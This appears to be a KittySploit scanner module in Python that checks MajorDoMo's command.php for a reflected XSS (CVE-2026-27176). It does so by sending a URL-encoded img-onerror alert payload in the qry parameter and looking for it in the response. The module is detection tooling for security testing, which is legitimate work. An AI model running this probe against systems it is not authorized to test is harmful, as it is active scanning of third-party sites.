#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""MajorDoMo contains a reflected XSS caused by unsanitized $qry parameter in command."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'MajorDoMo - Cross-Site Scripting Detection',
        'description': 'MajorDoMo contains a reflected XSS caused by unsanitized $qry parameter in command.php, letting attackers inject arbitrary JavaScript via crafted URLs, exploit requires victim to visit malicious URL.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2026', 'xss', 'majordomo'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2026-27176'],
        'cve': 'CVE-2026-27176',
    }

    def run(self):
        path = '/command.php?qry=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        body_all = ('"><img src=x onerror=alert(document.domain)>', 'Command:',)
        ctype_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in content_type for m in ctype_any)):
            self.set_info(
                severity='medium',
                reason='MajorDoMo - Cross-Site Scripting detected',
                path=path,
            )
            return True
        return False

